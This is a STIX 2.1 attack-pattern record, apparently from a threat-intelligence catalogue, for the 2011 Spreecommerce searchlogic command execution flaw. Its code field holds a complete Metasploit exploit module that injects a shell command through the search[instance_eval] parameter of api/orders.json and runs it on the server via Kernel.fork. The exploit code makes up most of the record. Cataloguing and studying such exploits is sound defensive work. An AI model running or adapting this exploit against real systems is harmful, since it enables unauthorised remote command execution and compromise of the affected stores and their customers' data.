{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aca55680-623b-41bd-9e46-958e1e9b6d72",
    "created": "2024-08-14T17:11:36.036864Z",
    "modified": "2024-08-14T17:11:36.036868Z",
    "name": "Spreecommerce Arbitrary Command Execution",
    "description": " This module exploits an arbitrary command execution vulnerability in the Spreecommerce API searchlogic for versions 0.50.0 and earlier. Unvalidated input is called via the Ruby send method allowing command execution. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/spree_searchlogic_exec.rb",
            "external_id": "spree_searchlogic_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.spreecommerce.com/blog/2011/04/19/security-fixes/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Spreecommerce Arbitrary Command Execution',\n      'Description'    => %q{\n          This module exploits an arbitrary command execution vulnerability in\n          the Spreecommerce API searchlogic for versions 0.50.0 and earlier.\n          Unvalidated input is called via the Ruby send method allowing command\n          execution.\n      },\n      'Author'         => [ 'joernchen <joernchen[at]phenoelit.de>' ], #Phenoelit\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '71900'],\n          [ 'URL', 'http://www.spreecommerce.com/blog/2011/04/19/security-fixes/' ],\n\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x60\",\n          'DisableNops' => true,\n          'Space'       => 31337,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n            }\n        },\n      'Platform'       => %w{ linux unix },\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2011-04-19',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('URI', [true, \"The path to the Spreecommerce main site\", \"/\"]),\n        ])\n  end\n\n  def exploit\n    command = Rex::Text.uri_encode(payload.raw, 'hex-noslashes')\n\n    urlconfigdir = normalize_uri(datastore['URI']) + '/' + \"api/orders.json?search[instance_eval]=Kernel.fork%20do%60#{command}%60end\"\n    res = send_request_raw({\n      'uri'     => urlconfigdir,\n      'method'  => 'GET',\n      'headers' =>\n      {\n        'HTTP_AUTHORIZATION' => 'ABCD', #needs to be present\n        'User-Agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',\n        'Connection' => 'Close',\n      }\n    }, 0.4 ) #short timeout, we don't care about the response\n    if (res)\n      print_status(\"The server returned: #{res.code} #{res.message}\")\n    end\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-04-19",
    "x_mitre_platforms": [
        "%w{ linux unix }"
    ]
}